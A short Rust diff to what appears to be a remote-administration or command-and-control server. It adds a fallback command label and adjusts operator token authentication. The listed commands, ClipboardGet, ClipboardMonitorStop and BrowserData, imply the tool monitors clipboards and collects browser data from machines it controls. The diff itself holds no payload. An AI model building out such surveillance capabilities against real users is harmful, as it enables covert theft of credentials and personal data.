@@ -1560,6 +1560,7 @@ fn command_label(c: &Command) -> &'static str {
         Command::ClipboardMonitorStop => "ClipboardMonitorStop",
         Command::ClipboardGet => "ClipboardGet",
         Command::BrowserData { .. } => "BrowserData",
+        _ => "Unknown",
     }
 }
 
@@ -1611,7 +1612,7 @@ async fn ws_handler(
     use subtle::ConstantTimeEq;
 
     // 1. Try the multi-operator store.
-    if let Some(operator_id) = state.authenticate_operator(&token) {
+    if let Some((operator_id, _permissions)) = state.authenticate_operator(&token) {
         // P1-12: Generate a random session ID instead of echoing the real
         // bearer token in the Sec-WebSocket-Protocol response header.
         let session_id = uuid::Uuid::new_v4().to_string();
@@ -1623,7 +1624,7 @@ async fn ws_handler(
     }
 
     // 2. Fallback: legacy single admin token — hash and compare.
-    let presented_hash = crate::config::OperatorRecord::hash_token(token);
+    let presented_hash = crate::config::OperatorRecord::hash_token(&token);
     let ok: bool = presented_hash
         .as_bytes()
         .ct_eq(state.admin_token_hash.as_bytes())
